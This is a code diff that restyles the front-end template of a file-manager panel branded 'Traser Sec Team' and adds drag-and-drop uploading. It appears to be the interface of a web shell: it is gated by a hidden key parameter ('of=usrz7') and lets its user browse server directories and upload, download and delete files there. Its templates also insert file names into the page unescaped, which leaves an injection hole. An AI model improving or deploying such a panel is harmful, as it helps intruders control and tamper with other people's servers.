@@ -6,19 +6,83 @@
 <title>Traser Sec Team</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
-body{margin:0;padding:20px;font-family:Inter,sans-serif;background:#fff;color:#0f172a}
-.card{max-width:1000px;margin:auto;padding:20px;border-radius:12px;background:#fbfdff;box-shadow:0 5px 15px rgba(0,0,0,0.05)}
-.button{padding:8px 12px;border-radius:8px;border:0;background:#0f172a;color:#fff;cursor:pointer;margin-left:4px}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-top:16px}
-.item{padding:12px;border-radius:10px;background:#fff;box-shadow:0 2px 8px rgba(0,0,0,0.05);display:flex;flex-direction:column;justify-content:space-between}
-.item span{word-break:break-all;font-size:14px}
-.actions{margin-top:8px;display:flex;gap:6px}
-.actions a,.actions button{flex:1;text-align:center;text-decoration:none;color:#0f172a;background:#eef2ff;padding:6px 4px;border-radius:6px;border:1px solid #e2efff;cursor:pointer;font-size:13px}
-.actions button{background:#ffeef0;border-color:#fbb6c2;color:#b91c1c}
-.breadcrumb{margin-bottom:12px;font-size:14px;color:#6b7280}
-input[type=file]{display:none}
-.notice{margin-top:10px;color:#b91c1c}
-.preview{margin-top:16px;height:300px;border-radius:10px;border:1px dashed #eef2f7;display:flex;align-items:center;justify-content:center;color:#6b7280;overflow:auto}
+body {
+  margin:0; padding:20px;
+  font-family:Inter,sans-serif;
+  background:#f3f4f6;
+  color:#0f172a;
+}
+.card {
+  max-width:1100px; margin:auto;
+  padding:24px;
+  border-radius:14px;
+  background:#fff;
+  box-shadow:0 8px 24px rgba(0,0,0,0.08);
+  transition:0.2s;
+}
+.card:hover { box-shadow:0 12px 36px rgba(0,0,0,0.12); }
+.breadcrumb {
+  margin-bottom:16px;
+  font-size:14px;
+  color:#6b7280;
+}
+.breadcrumb a { text-decoration:none; color:#2563eb; margin-right:4px; }
+.upload-area {
+  border:2px dashed #e2e8f0;
+  border-radius:12px;
+  padding:20px;
+  text-align:center;
+  cursor:pointer;
+  transition:0.2s;
+  margin-bottom:16px;
+}
+.upload-area.dragover { background:#eef2ff; }
+.button { padding:10px 16px; border-radius:8px; border:0; background:#0f172a; color:#fff; cursor:pointer; margin:4px 0; }
+.notice { margin-top:12px; color:#b91c1c; }
+.grid {
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+  gap:16px;
+  margin-top:16px;
+}
+.item {
+  padding:12px;
+  border-radius:10px;
+  background:#fff;
+  box-shadow:0 2px 12px rgba(0,0,0,0.06);
+  display:flex;
+  flex-direction:column;
+  justify-content:space-between;
+  transition:0.2s;
+}
+.item:hover { box-shadow:0 6px 24px rgba(0,0,0,0.12); }
+.item span { word-break:break-all; font-weight:500; font-size:14px; cursor:pointer; }
+.actions { margin-top:8px; display:flex; gap:6px; }
+.actions a, .actions button {
+  flex:1;
+  text-align:center;
+  text-decoration:none;
+  color:#0f172a;
+  background:#eef2ff;
+  padding:6px 4px;
+  border-radius:6px;
+  border:1px solid #e2efff;
+  cursor:pointer;
+  font-size:13px;
+}
+.actions button { background:#ffeef0; border-color:#fbb6c2; color:#b91c1c; }
+.preview {
+  margin-top:20px;
+  height:320px;
+  border-radius:12px;
+  border:2px dashed #e2e8f0;
+  display:flex; align-items:center; justify-content:center;
+  color:#6b7280;
+  overflow:auto;
+  background:#f9fafb;
+  transition:0.2s;
+}
+.preview img, .preview iframe { border-radius:8px; max-width:100%; max-height:100%; }
 </style>
 </head>
 <body>
@@ -27,55 +91,76 @@ input[type=file]{display:none}
     <a href="?of=usrz7&dir={{parentDir}}">../</a> {{currentDir}}
   </div>
 
-  <form method="post" enctype="multipart/form-data" action="traser.php?of=usrz7&dir={{currentDir}}">
-    <label class="button" for="fileinput">Pilih File</label>
-    <input type="file" id="fileinput" name="file" required>
-    <input type="hidden" name="csrf" value="{{csrf}}">
-    <input type="hidden" name="action" value="upload">
-    <button type="submit" class="button">Upload</button>
-  </form>
-
+  <div class="upload-area" id="uploadArea">
+    Drag & Drop file atau klik untuk pilih file
+    <input type="file" id="fileinput" name="file" style="display:none" required>
+  </div>
+  <button class="button" id="uploadBtn">Upload</button>
   <div class="notice">{{opmsg}}</div>
 
   <div class="grid" id="filelist"></div>
-
   <div class="preview" id="preview">Pilih file untuk preview (image/pdf)</div>
 </div>
 
 <script>
 const FILES=JSON.parse('{{filelist}}');
 const currentDir='{{currentDir}}';
+const csrf='{{csrf}}';
 const listEl=document.getElementById('filelist');
 const previewEl=document.getElementById('preview');
+const uploadArea=document.getElementById('uploadArea');
+const fileInput=document.getElementById('fileinput');
+const uploadBtn=document.getElementById('uploadBtn');
 
 function renderList(){
-  listEl.innerHTML=FILES.map(f=>`<div class="item">
-    <span>${f}</span>
-    <div class="actions">
-      <a href="download.php?file=${encodeURIComponent(f)}&dir=${currentDir}" target="_blank">Download</a>
-      <form method="post" style="display:inline" action="traser.php?of=usrz7&dir=${currentDir}">
-        <input type="hidden" name="file" value="${f}">
-        <input type="hidden" name="csrf" value="{{csrf}}">
-        <input type="hidden" name="action" value="delete">
-        <button type="submit">Delete</button>
-      </form>
+  listEl.innerHTML = FILES.map(f=>`
+    <div class="item">
+      <span>${f}</span>
+      <div class="actions">
+        <a href="?of=usrz7&dir=${currentDir}&download=${encodeURIComponent(f)}" target="_blank">Download</a>
+        <form method="post" style="display:inline" action="?of=usrz7&dir=${currentDir}">
+          <input type="hidden" name="file" value="${f}">
+          <input type="hidden" name="csrf" value="${csrf}">
+          <input type="hidden" name="action" value="delete">
+          <button type="submit">Delete</button>
+        </form>
+      </div>
     </div>
-  </div>`).join('');
+  `).join('');
 
   document.querySelectorAll('#filelist .item span').forEach(el=>{
     el.addEventListener('click',()=>{
       const name=el.textContent;
       const ext=name.split('.').pop().toLowerCase();
       if(['png','jpg','jpeg','webp'].includes(ext)){
-        previewEl.innerHTML=`<img src="download.php?file=${encodeURIComponent(name)}&dir=${currentDir}" style="max-width:100%;max-height:100%;border-radius:8px"/>`;
+        previewEl.innerHTML=`<img src="?of=usrz7&dir=${currentDir}&download=${encodeURIComponent(name)}"/>`;
       } else if(ext==='pdf'){
-        previewEl.innerHTML=`<iframe src="download.php?file=${encodeURIComponent(name)}&dir=${currentDir}" style="width:100%;height:100%;border:0;border-radius:8px"></iframe>`;
+        previewEl.innerHTML=`<iframe src="?of=usrz7&dir=${currentDir}&download=${encodeURIComponent(name)}"></iframe>`;
       } else {
         previewEl.textContent='Tidak ada preview untuk file ini';
       }
     });
   });
 }
+
+uploadArea.addEventListener('click',()=>fileInput.click());
+uploadArea.addEventListener('dragover',e=>{ e.preventDefault(); uploadArea.classList.add('dragover'); });
+uploadArea.addEventListener('dragleave',e=>{ e.preventDefault(); uploadArea.classList.remove('dragover'); });
+uploadArea.addEventListener('drop',e=>{
+  e.preventDefault();
+  uploadArea.classList.remove('dragover');
+  fileInput.files = e.dataTransfer.files;
+});
+
+uploadBtn.addEventListener('click',()=>{
+  if(!fileInput.files.length){ alert('Pilih file'); return; }
+  const fd=new FormData();
+  fd.append('file',fileInput.files[0]);
+  fd.append('csrf',csrf);
+  fd.append('action','upload');
+  fetch(`?of=usrz7&dir=${currentDir}`, { method:'POST', body:fd })
+    .then(r=>r.text()).then(()=>location.reload());
+});
 
 renderList();
 </script>
